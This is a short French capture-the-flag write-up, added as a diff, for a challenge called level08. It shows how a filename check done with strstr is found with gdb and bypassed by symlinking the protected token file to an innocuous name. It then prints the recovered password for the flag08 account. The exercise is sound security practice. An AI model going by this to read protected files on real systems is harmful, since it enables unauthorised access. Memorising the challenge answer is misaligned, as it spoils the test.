@@ -1,0 +1,19 @@
+On execute ./level08 avec token en parametres on nous dis que l'on n'a pas les droits sur token
+
+You may not access 'token'
+
+echo 'test' > /tmp/token
+
+./level08 /tmp/token
+
+You may not access '/tmp/token'
+
+On utilise gdb et on voit qu'il y'a un strstr qui verifie si le fichier passer en parametre contient 'token'
+
+Ensuite c'est facile
+
+ln -s ~/token /tmp/get
+
+./level08 /tmp/get
+
+quif5eloekouj29ke0vouxean c'est le token pour se connecter avec su flag08 pas le token pour valider.
